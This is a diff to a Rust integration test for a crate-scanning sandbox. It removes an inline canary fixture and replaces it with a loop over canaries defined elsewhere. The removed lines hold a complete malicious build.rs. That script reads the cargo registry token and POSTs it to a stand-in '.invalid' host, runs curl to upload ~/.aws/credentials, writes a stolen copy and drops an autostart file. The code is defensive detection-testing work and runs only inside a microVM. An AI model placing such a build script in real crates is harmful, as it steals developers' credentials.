@@ -1,14 +1,9 @@
-//! Canary: a crate that steals honeytokens must be caught.
+//! Canaries: the known bad fixture crate must be caught, the known good
+//! one must come out clean (`crateward_orchestrator::canary`).
 //!
-//! The fixture below is a tiny crate whose build script reads the cargo
-//! registry token from the builder's home and POSTs it to a made up host
-//! over plain HTTP, and has `curl` POST the AWS credentials over HTTPS.
-//! Its source exists only as strings in this file: it is packed into a tar,
-//! vendored into a payload image and compiled and run **only inside a
-//! microVM**, never on the host (the rule in docs/TESTING.md). The test
-//! passes if the fake internet saw the lookups and connections, terminated
-//! the TLS connection, and the orchestrator found the job's own tokens in
-//! what left the VM.
+//! Their sources exist only as strings in the orchestrator: they are packed
+//! into a tar, vendored into a payload image and compiled and run **only
+//! inside a microVM**, never on the host (the rule in docs/TESTING.md).
 //!
 //! Needs `/dev/kvm`, the guest images, subordinate IDs and a delegated
 //! cgroup, so it runs on the server through `cargo xtask canary`.
@@ -25,60 +20,12 @@ use std::path::{Path, PathBuf};
 use std::time::Duration;
 
 use crateward_core::blobs::BlobStore;
-use crateward_core::job::BuildOutcome;
-use crateward_core::name::CrateName;
 use crateward_orchestrator::backend::{FirecrackerBackend, FirecrackerConfig};
+use crateward_orchestrator::canary;
 use crateward_orchestrator::cgroup::{CgroupTree, SlotLimits};
 use crateward_orchestrator::firecracker::vm::{BootSpec, JobDrives};
 use crateward_orchestrator::honeytokens::Honeytokens;
-use crateward_orchestrator::payload::{Package, PayloadSpec};
-use crateward_orchestrator::trace::Role;
 use crateward_orchestrator::worker::{JobFiles, RunPlan, WorkerSetup, execute};
-
-const NAME: &str = "canary-exfil";
-const VERSION: &str = "0.1.0";
-const HOST: &str = "exfil.crateward-canary.invalid";
-
-const MANIFEST: &str = "[package]\nname = \"canary-exfil\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n";
-
-/// Runs only in the microVM. Reads the token and sends it out.
-const BUILD_RS: &str = r#"use std::io::{Read, Write};
-fn main() {
-    let home = std::env::var("HOME").unwrap_or_default();
-    let mut token = String::new();
-    if let Ok(mut file) = std::fs::File::open(format!("{home}/.cargo/credentials.toml")) {
-        let _ = file.read_to_string(&mut token);
-    }
-    if let Ok(mut stream) = std::net::TcpStream::connect("exfil.crateward-canary.invalid:80") {
-        let _ = write!(
-            stream,
-            "POST /collect HTTP/1.1\r\nHost: exfil.crateward-canary.invalid\r\nContent-Length: {}\r\n\r\n{}",
-            token.len(),
-            token
-        );
-        let mut reply = Vec::new();
-        let _ = stream.read_to_end(&mut reply);
-    }
-    // Persistence and a copy of the loot on the scratch disk.
-    if let Ok(out) = std::env::var("OUT_DIR") {
-        let _ = std::fs::write(format!("{out}/stolen.txt"), &token);
-    }
-    let autostart = format!("{home}/.config/autostart");
-    if std::fs::create_dir_all(&autostart).is_ok() {
-        let _ = std::fs::write(format!("{autostart}/canary.desktop"), "[Desktop Entry]\n");
-    }
-    // No IPv6 route in the guest: the attempt fails there, and the trace
-    // must still show it.
-    if let Ok(target) = "[2001:db8::7]:443".parse() {
-        let _ = std::net::TcpStream::connect_timeout(&target, std::time::Duration::from_secs(2));
-    }
-    let _ = std::process::Command::new("curl")
-        .args(["-s", "-m", "10", "-X", "POST", "--data-binary"])
-        .arg(format!("@{home}/.aws/credentials"))
-        .arg("https://tls.crateward-canary.invalid/collect")
-        .status();
-}
-"#;
 
 fn root() -> PathBuf {
     Path::new(env!("CARGO_MANIFEST_DIR"))
@@ -88,42 +35,9 @@ fn root() -> PathBuf {
         .unwrap()
 }
 
-fn fixture_tar() -> Vec<u8> {
-    let mut builder = tar::Builder::new(Vec::new());
-    for (path, data) in [
-        ("Cargo.toml", MANIFEST),
-        ("build.rs", BUILD_RS),
-        ("src/lib.rs", ""),
-    ] {
-        let mut header = tar::Header::new_gnu();
-        header.set_size(data.len() as u64);
-        header.set_mode(0o644);
-        header.set_cksum();
-        builder
-            .append_data(
-                &mut header,
-                format!("{NAME}-{VERSION}/{path}"),
-                data.as_bytes(),
-            )
-            .unwrap();
-    }
-    builder.into_inner().unwrap()
-}
-
-fn lockfile(checksum: &str) -> String {
-    format!(
-        "version = 4\n\n\
-         [[package]]\nname = \"{NAME}\"\nversion = \"{VERSION}\"\n\
-         source = \"registry+https://github.com/rust-lang/crates.io-index\"\n\
-         checksum = \"{checksum}\"\n\n\
-         [[package]]\nname = \"crateward-probe\"\nversion = \"0.0.0\"\n\
-         dependencies = [\n \"{NAME}\",\n]\n"
-    )
-}
-
 #[tokio::test]
 #[ignore = "run through `cargo xtask canary`"]
-async fn a_build_script_that_steals_a_token_is_caught() {
+async fn canaries_give_their_known_results() {
     let work = root()
         .join("target/canary")
         .join(std::process::id().to_string());
@@ -191,25 +105,6 @@ async fn a_build_script_that_steals_a_token_is_caught() {
     let backend = FirecrackerBackend::new(config, cgroups, snapshot);
 
     let blobs = BlobStore::open(&work.join("cas")).unwrap();
-    let tar = fixture_tar();
-    let blob = blobs.put(&tar).unwrap();
-    // Any 64 hex digits do: the lockfile and the vendored checksum file
-    // only have to agree.
-    let checksum = blob.blake3.clone();
-    let spec = PayloadSpec {
-        name: CrateName::parse(NAME).unwrap(),
-        version: VERSION.parse().unwrap(),
-        lockfile: lockfile(&checksum),
-        packages: vec![Package {
-            name: NAME.into(),
-            version: VERSION.into(),
-            checksum,
-            blake3: blob.blake3,
-        }],
-        extra_probes: Vec::new(),
-        files: Vec::new(),
-        stubs: Vec::new(),
-    };
     let setup = WorkerSetup {
         exe: PathBuf::from(env!("CARGO_BIN_EXE_crateward_orchestrator")),
         work_dir: work.clone(),
@@ -218,96 +113,28 @@ async fn a_build_script_that_steals_a_token_is_caught() {
         warm: None,
         warm_placeholder: work.join("placeholder-warm.img"),
     };
-    let files = JobFiles {
-        payload: work.join("job.payload"),
-        scratch: work.join("job.scratch"),
-        network: work.join("job.network"),
-        warm: None,
-        warm_placeholder: work.join("placeholder-warm.img"),
-    };
-    let tokens = Honeytokens::generate(&mut rand::rng(), 1000);
-    let plan = RunPlan::check(Duration::from_secs(300));
-    let report = execute(&backend, 0, &setup, &blobs, 1, spec, &tokens, &files, &plan)
-        .await
-        .unwrap();
-    eprintln!("{}", serde_json::to_string_pretty(&report).unwrap());
-    assert_eq!(
-        report.outcome,
-        BuildOutcome::Succeeded,
-        "{}",
-        report.stderr_tail
-    );
-    assert!(report.network.dns.iter().any(|n| n == HOST));
-    let found =
-        |kind: &str, via: &str| report.leaked.iter().any(|l| l.kind == kind && l.via == via);
-    assert!(
-        found("cargo_registry_token", &format!("http://{HOST}")),
-        "the token sent over HTTP was not found: {:?}",
-        report.leaked
-    );
-    assert!(
-        found("aws_access_key_id", "https://tls.crateward-canary.invalid"),
-        "the key sent over HTTPS was not found: {:?}",
-        report.leaked
-    );
-    // The guest's own account (eBPF): the build script read the cargo
-    // credentials, connected out and started curl, which read the AWS file.
-    let trace = &report.trace;
-    assert!(trace.complete, "the trace did not end: {:?}", trace.totals);
-    let script = trace
-        .processes
-        .iter()
-        .find(|p| p.role == Role::BuildScript && p.exe.contains("canary-exfil"))
-        .expect("the build script is in the trace");
-    let opened = |pid: u32, file: &str| {
-        trace
-            .sensitive_opens
-            .iter()
-            .any(|f| f.pid == pid && f.path.ends_with(file))
-    };
-    assert!(opened(script.pid, "/.cargo/credentials.toml"));
-    assert!(
-        trace
-            .sockets
-            .iter()
-            .any(|s| s.pid == script.pid && s.how == "connect" && s.address.ends_with(":80"))
-    );
-    assert!(
-        trace
-            .sockets
-            .iter()
-            .any(|s| s.pid == script.pid && s.address == "[2001:db8::7]:443"),
-        "the IPv6 attempt is not in the trace: {:?}",
-        trace.sockets
-    );
-    let curl = trace
-        .processes
-        .iter()
-        .find(|p| p.ppid == Some(script.pid) && p.exe.ends_with("/curl"))
-        .expect("curl, started by the build script, is in the trace");
-    assert!(opened(curl.pid, "/.aws/credentials"));
-    assert!(curl.argv.iter().any(|a| a.ends_with("/.aws/credentials")));
-    // The host's own reading of the scratch disk.
-    let scratch = report
-        .scratch
-        .as_ref()
-        .expect("the scratch disk was scanned");
-    assert!(scratch.error.is_none(), "{:?}", scratch.error);
-    assert!(
-        report
-            .tokens_on_disk
-            .iter()
-            .any(|l| l.kind == "cargo_registry_token" && l.via.ends_with("/stolen.txt")),
-        "the copied token was not found: {:?}",
-        report.tokens_on_disk
-    );
-    assert!(
-        scratch
-            .outside_build
-            .iter()
-            .any(|e| e.path == "/work/home/.config/autostart/canary.desktop"),
-        "the autostart file was not found: {:?}",
-        scratch.outside_build
-    );
+    for canary in canary::ALL {
+        let files = JobFiles {
+            payload: work.join("job.payload"),
+            scratch: work.join("job.scratch"),
+            network: work.join("job.network"),
+            warm: None,
+            warm_placeholder: work.join("placeholder-warm.img"),
+        };
+        let spec = canary.payload(&blobs).unwrap();
+        let tokens = Honeytokens::generate(&mut rand::rng(), 1000);
+        let plan = RunPlan::check(Duration::from_secs(300));
+        let report = execute(&backend, 0, &setup, &blobs, 1, spec, &tokens, &files, &plan)
+            .await
+            .unwrap();
+        let problems = canary.check(&report);
+        assert!(
+            problems.is_empty(),
+            "{}: {problems:?}\n{}",
+            canary.name,
+            serde_json::to_string_pretty(&report).unwrap()
+        );
+        eprintln!("{} passed in {} ms", canary.name, report.run_ms);
+    }
     std::fs::remove_dir_all(&work).unwrap();
 }
